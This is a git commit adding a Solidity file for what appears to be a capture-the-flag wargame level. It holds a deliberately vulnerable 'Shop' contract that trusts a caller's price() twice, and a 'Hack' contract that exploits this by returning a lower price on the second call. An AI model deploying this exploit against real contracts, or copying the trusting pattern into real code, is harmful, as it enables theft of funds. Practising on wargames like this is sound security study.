70a53a76ea8ad489481292907ef4c8f7e4354347
1300Hrs <92827559+Shoelacez@users.noreply.github.com>
2023-03-22 12:23:06 +0800

    shop

---
+++ Levels/level-15/shop.sol
@@ -0,0 +1,43 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Buyer {
+  function price() external view returns (uint);
+}
+
+contract Shop {
+  uint public price = 100;
+  bool public isSold;
+
+  function buy() public {
+    Buyer _buyer = Buyer(msg.sender);
+
+    if (_buyer.price() >= price && !isSold) {
+      isSold = true;
+      price = _buyer.price();
+    }
+  }
+}
+
+contract Hack{
+    Shop private immutable victim;
+
+    constructor(address _victimAddr){
+        victim = Shop(_victimAddr);
+    }
+    function pwn() external{
+        victim.buy();
+        require(victim.price() == 99, "Price != 99");
+    }
+
+    function price() external view returns (uint){
+        if (victim.isSold()){
+            // 2nd call
+            return 99;
+        }
+        // 1st call
+        return 100;
+    }
+
+
+}
